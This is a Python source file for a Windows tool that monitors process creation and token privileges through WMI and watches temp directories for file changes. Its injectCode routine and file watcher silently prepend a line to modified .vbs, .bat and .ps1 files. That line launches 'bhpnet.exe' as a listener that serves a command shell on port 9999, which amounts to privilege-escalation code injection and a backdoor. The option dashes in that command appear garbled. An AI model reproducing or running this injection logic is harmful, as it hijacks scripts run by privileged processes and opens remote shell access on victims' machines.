# encoding=utf8
# tools.py
# Created by Starwarsfan2099 on 1/18/2020

import utilities
import pythoncom
import win32api
import win32con
import win32file
import win32security
import wmi
import os
import tempfile
import threading
from colorama import Fore

utils = utilities.Utilities.getInstance()


class Tools:
    def __init__(self, verbose, debug):
        self.verbose = verbose
        self.debug = debug

    def getProcessPrivilages(self, pid):
        priv_list = []
        try:
            # obtain a handle to the target process
            hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)

            # open the main process token
            htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)

            # retrieve the list of privileges enabled
            privs = win32security.GetTokenInformation(htok, win32security.TokenPrivileges)

            # iterate over privileges and output the ones that are enabled
            for priv_id, priv_flags in privs:
                # check if the privilege is enabled
                if priv_flags == 3:
                    priv_list.append(win32security.LookupPrivilegeName(None, priv_id))
        except:
            priv_list.append("N/A")
        return "|".join(priv_list)


    def processMonitor(self):
        try:
            pythoncom.CoInitialize()
            c = wmi.WMI()
            process_watcher = c.Win32_Process.watch_for("creation")
            while True:
                utils.dbgPrint("[DEBUG] Watching for processes now...", Fore.GREEN, verbose=self.debug)
                new_process = process_watcher()
                proc_owner = new_process.GetOwner()
                proc_owner = "%s\\%s" % (proc_owner[0], proc_owner[2])
                create_date = new_process.CreationDate
                executable = new_process.ExecutablePath
                cmdline = new_process.CommandLine
                pid = new_process.ProcessId
                parent_pid = new_process.ParentProcessId
                privileges = self.getProcessPrivilages(pid)
                utils.dbgPrint("\nDate: ", Fore.GREEN, secondLine="%s" % create_date)
                utils.dbgPrint("Process Owners: ", Fore.GREEN, secondLine="%s" % proc_owner)
                utils.dbgPrint("Executable: ", Fore.GREEN, secondLine="%s" % executable)
                utils.dbgPrint("Command line: ", Fore.GREEN, secondLine="%s" % cmdline)
                utils.dbgPrint("PID: ", Fore.GREEN, secondLine="%s" % pid)
                utils.dbgPrint("Parent PID: ", Fore.GREEN, secondLine="%s" % parent_pid)
                utils.dbgPrint("Privileges: ", Fore.GREEN, secondLine="%s\n" % privileges)
        except KeyboardInterrupt:
            utils.dbgPrint("\n[-] Exited process monitor.\n", Fore.RED)
            return False


    def fileMonitor(self, command):
        if len(command.split()) == 1:
            dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]
        elif len(command.split()) == 2:
            dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir(), str(command.split()[1])]
        else:
            utils.dbgPrint("[-] Improper arguments supplied.", Fore.RED)
            return False
        for path in dirs_to_monitor:
            if dirs_to_monitor[len(dirs_to_monitor) - 1] == path:
                utils.dbgPrint("\n[+] Spawning monitoring thread for path: %s\n" % path, Fore.GREEN)
                self.startFileMonitor(path)
                return True
            monitor_thread = threading.Thread(target=self.startFileMonitor, args=(path,))
            monitor_thread.daemon = True
            utils.dbgPrint("\n[+] Spawning monitoring thread for path: %s\n" % path, Fore.GREEN)
            monitor_thread.start()


    def injectCode(self, full_filename, extension, contents):
        file_types = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker", "Start-Process \"%s\"" % command]
        # is our marker already in the file?
        if file_types[extension][0] in contents:
            return
        # no marker let's inject the marker and code
        full_contents = file_types[extension][0]
        full_contents += file_types[extension][1]
        full_contents += contents
        fd = open(full_filename, "wb")
        fd.write(full_contents)
        fd.close()
        utils.dbgPrint("[+] Injected code.", Fore.GREEN)
        return


    def startFileMonitor(self, path_to_watch):
        # we create a thread for each monitoring run
        FILE_LIST_DIRECTORY = 0x0001
        FILE_CREATED = 1
        FILE_DELETED = 2
        FILE_MODIFIED = 3
        FILE_RENAMED_FROM = 4
        FILE_RENAMED_TO = 5
        file_types = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker", "Start-Process \"%s\"" % command]
        h_directory = win32file.CreateFile(
            path_to_watch,
            FILE_LIST_DIRECTORY,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None)
        while 1:
            try:
                results = win32file.ReadDirectoryChangesW(
                    h_directory,
                    1024,
                    True,
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                    win32con.FILE_NOTIFY_CHANGE_SIZE |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                    win32con.FILE_NOTIFY_CHANGE_SECURITY,
                    None,
                    None
                )
                for action, file_name in results:
                    full_filename = os.path.join(path_to_watch, file_name)
                    if action == FILE_CREATED:
                        utils.dbgPrint("\n[+] Created %s" % full_filename, Fore.GREEN)
                    elif action == FILE_DELETED:
                        utils.dbgPrint("\n[-] Deleted %s" % full_filename, Fore.RED)
                    elif action == FILE_MODIFIED:
                        utils.dbgPrint("\n[*] Modified %s" % full_filename, Fore.YELLOW)
                        utils.dbgPrint("\n[+] Dumping contents...", Fore.GREEN, verbose=self.verbose)
                        try:
                            fd = open(full_filename, "rb")
                            contents = fd.read()
                            fd.close()
                            utils.dbgPrint(contents, verbose=self.verbose)
                            utils.dbgPrint("[+] Dump complete.", Fore.GREEN, verbose=self.verbose)
                        except:
                            utils.dbgPrint("[-] Failed dumping file.", Fore.RED, verbose=self.verbose)

                        filename, extension = os.path.splitext(full_filename)

                        if extension in file_types:
                            self.injectCode(full_filename, extension, contents)

                    elif action == FILE_RENAMED_FROM:
                        utils.dbgPrint("[>] Renamed from: %s" % full_filename, Fore.GREEN)
                    elif action == FILE_RENAMED_TO:
                        utils.dbgPrint("[<] Renamed to: %s" % full_filename, Fore.GREEN)
                    else:
                        utils.dbgPrint("[?] Unknown: %s" % full_filename, Fore.GREEN)
            except KeyboardInterrupt:
                utils.dbgPrint("\n[-] Exited file monitor.\n", Fore.RED)
                return False